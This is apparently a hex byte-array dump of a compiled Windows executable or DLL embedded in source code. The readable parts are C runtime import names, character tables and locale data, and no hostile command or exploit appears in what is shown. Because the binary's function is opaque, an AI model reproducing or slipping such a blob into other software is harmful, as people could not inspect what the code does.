0x4e, 0x65, 0x78, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x57, 0x0, 0xa4, 0x3, 0x49, 0x73, 0x56, 0x61, 0x6c, 0x69, 0x64, 0x43, 0x6f, 0x64, 0x65, 0x50, 0x61, 0x67, 0x65, 0x0, 0xc4, 0x1, 0x47, 0x65, 0x74, 0x41, 0x43, 0x50, 0x0, 0x0, 0xad, 0x2, 0x47, 0x65, 0x74, 0x4f, 0x45, 0x4d, 0x43, 0x50, 0x0, 0x0, 0xd3, 0x1, 0x47, 0x65, 0x74, 0x43, 0x50, 0x49, 0x6e, 0x66, 0x6f, 0x0, 0xe8, 0x1, 0x47, 0x65, 0x74, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x41, 0x0, 0xe9, 0x1, 0x47, 0x65, 0x74, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x57, 0x0, 0x8, 0x4, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x42, 0x79, 0x74, 0x65, 0x54, 0x6f, 0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72, 0x0, 0x29, 0x6, 0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72, 0x54, 0x6f, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x42, 0x79, 0x74, 0x65, 0x0, 0x4b, 0x2, 0x47, 0x65, 0x74, 0x45, 0x6e, 0x76, 0x69, 0x72, 0x6f, 0x6e, 0x6d, 0x65, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x57, 0x0, 0x0, 0xbc, 0x1, 0x46, 0x72, 0x65, 0x65, 0x45, 0x6e, 0x76, 0x69, 0x72, 0x6f, 0x6e, 0x6d, 0x65, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x57, 0x0, 0xac, 0x1, 0x46, 0x6c, 0x73, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x0, 0xae, 0x1, 0x46, 0x6c, 0x73, 0x47, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x0, 0xaf, 0x1, 0x46, 0x6c, 0x73, 0x53, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x0, 0xad, 0x1, 0x46, 0x6c, 0x73, 0x46, 0x72, 0x65, 0x65, 0x0, 0xca, 0x3, 0x4c, 0x43, 0x4d, 0x61, 0x70, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x57, 0x0, 0x0, 0xcb, 0x2, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x48, 0x65, 0x61, 0x70, 0x0, 0x0, 0xea, 0x2, 0x47, 0x65, 0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x0, 0x0, 0x62, 0x2, 0x47, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x54, 0x79, 0x70, 0x65, 0x0, 0xef, 0x2, 0x47, 0x65, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x54, 0x79, 0x70, 0x65, 0x57, 0x0, 0x0, 0x6c, 0x3, 0x48, 0x65, 0x61, 0x70, 0x53, 0x69, 0x7a, 0x65, 0x0, 0x0, 0x6a, 0x3, 0x48, 0x65, 0x61, 0x70, 0x52, 0x65, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x72, 0x5, 0x53, 0x65, 0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x0, 0x0, 0xb1, 0x1, 0x46, 0x6c, 0x75, 0x73, 0x68, 0x46, 0x69, 0x6c, 0x65, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x73, 0x0, 0x0, 0x3d, 0x6, 0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x0, 0x12, 0x2, 0x47, 0x65, 0x74, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x43, 0x50, 0x0, 0x0, 0xe, 0x2, 0x47, 0x65, 0x74, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x4d, 0x6f, 0x64, 0x65, 0x0, 0x0, 0x49, 0x5, 0x53, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x50, 0x6f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x45, 0x78, 0x0, 0x0, 0xd3, 0x0, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x57, 0x0, 0x8e, 0x0, 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x0, 0x3c, 0x6, 0x57, 0x72, 0x69, 0x74, 0x65, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x57, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7, 0x26, 0xd8, 0x8e, 0xb8, 0x78, 0xf9, 0x78, 0x84, 0x3c, 0x0, 0xa8, 0x5b, 0xa, 0x6a, 0xe2, 0xc9, 0x6d, 0x63, 0x8b, 0x87, 0x9e, 0x80, 0xb5, 0x16, 0xc5, 0xa5, 0xc7, 0xda, 0x44, 0x1d, 0x2d, 0xae, 0x48, 0x2c, 0xb1, 0xc8, 0x92, 0xf5, 0xbc, 0xf5, 0xb8, 0xe6, 0xda, 0x9, 0x3c, 0x85, 0x9e, 0xac, 0xfa, 0x4c, 0xce, 0xa4, 0x35, 0x0, 0xdc, 0x50, 0x6b, 0x36, 0xb7, 0x5c, 0xfb, 0x12, 0xf1, 0x52, 0x46, 0x5b, 0x15, 0x3, 0x7d, 0x7b, 0x4e, 0x8d, 0x71, 0xf5, 0x7c, 0x43, 0x87, 0x46, 0x54, 0x64, 0xf9, 0x75, 0xab, 0x65, 0xb0, 0xbf, 0x9b, 0xc3, 0xd2, 0x3a, 0x73, 0xfc, 0xe3, 0x35, 0xe1, 0x23, 0x5d, 0x29, 0xe5, 0x10, 0xe2, 0x72, 0xef, 0xa9, 0x25, 0xa, 0x5a, 0x1f, 0x8e, 0xf7, 0xa5, 0xd8, 0x8b, 0x16, 0x33, 0xcf, 0x91, 0xde, 0x17, 0x79, 0x6, 0x5f, 0xd9, 0x61, 0x2c, 0x6a, 0x90, 0x7a, 0xaf, 0xb3, 0xdd, 0x1e, 0x0, 0xe3, 0xf3, 0x70, 0x5, 0x7a, 0x6d, 0x42, 0x7f, 0xb2, 0xc, 0xe0, 0xa2, 0xce, 0x3b, 0x1f, 0xa3, 0xf5, 0xcf, 0xa9, 0x1f, 0x3a, 0xf7, 0xab, 0x3, 0xf3, 0x36, 0xf2, 0x86, 0xf4, 0x4f, 0x20, 0x4a, 0xaa, 0x6a, 0x1c, 0xae, 0xe0, 0x13, 0x29, 0xe3, 0xb7, 0x84, 0xd8, 0x9b, 0xbc, 0x2f, 0xa6, 0xb2, 0x5f, 0xdc, 0x3b, 0x1, 0x70, 0x16, 0x61, 0x4c, 0xee, 0x42, 0x69, 0xf6, 0x1, 0x87, 0x76, 0x2f, 0x84, 0x14, 0x38, 0xd3, 0xa6, 0xe0, 0x25, 0x57, 0xa0, 0x7e, 0x4c, 0x1c, 0x6, 0xf, 0xae, 0x29, 0x92, 0x10, 0x3f, 0x5a, 0xff, 0x1d, 0x57, 0x67, 0x18, 0xba, 0x67, 0xb1, 0x7d, 0x9a, 0x6f, 0x48, 0xa3, 0x23, 0x23, 0x12, 0x62, 0xe3, 0x8b, 0xfb, 0x3e, 0x63, 0x9, 0xd0, 0x1d, 0xf8, 0xb0, 0xf6, 0x9c, 0x94, 0xd4, 0xb3, 0x2b, 0xfe, 0xe, 0xbb, 0x98, 0x65, 0xcf, 0x29, 0x39, 0xf8, 0x74, 0x3b, 0x9d, 0x24, 0xc2, 0xc, 0xa4, 0xdf, 0x7e, 0x4, 0xfd, 0xf9, 0x11, 0xc5, 0x36, 0xc6, 0xb5, 0x27, 0xd, 0x16, 0xa9, 0xe, 0xe3, 0x9, 0x65, 0xfb, 0xa5, 0xa3, 0xaf, 0x86, 0x80, 0xd4, 0x5e, 0xa3, 0xae, 0x79, 0xa9, 0x92, 0x38, 0xbe, 0x79, 0x8a, 0x9c, 0x41, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0xcd, 0x5d, 0x20, 0xd2, 0x66, 0xd4, 0xff, 0xff, 0x32, 0xa2, 0xdf, 0x2d, 0x99, 0x2b, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x2f, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xc, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x2, 0x4, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa4, 0x3, 0x0, 0x0, 0x60, 0x82, 0x79, 0x82, 0x21, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa6, 0xdf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa1, 0xa5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0x9f, 0xe0, 0xfc, 0x0, 0x0, 0x0, 0x0, 0x40, 0x7e, 0x80, 0xfc, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x3, 0x0, 0x0, 0xc1, 0xa3, 0xda, 0xa3, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb5, 0x3, 0x0, 0x0, 0xc1, 0xa3, 0xda, 0xa3, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb6, 0x3, 0x0, 0x0, 0xcf, 0xa2, 0xe4, 0xa2, 0x1a, 0x0, 0xe5, 0xa2, 0xe8, 0xa2, 0x5b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x7e, 0xa1, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x51, 0x5, 0x0, 0x0, 0x51, 0xda, 0x5e, 0xda, 0x20, 0x0, 0x5f, 0xda, 0x6a, 0xda, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x81, 0xd3, 0xd8, 0xde, 0xe0, 0xf9, 0x0, 0x0, 0x31, 0x7e, 0x81, 0xfe, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x14, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x98, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x99, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x17, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf0, 0x18, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x70, 0xd, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x96, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x91, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x43, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x20, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x20, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 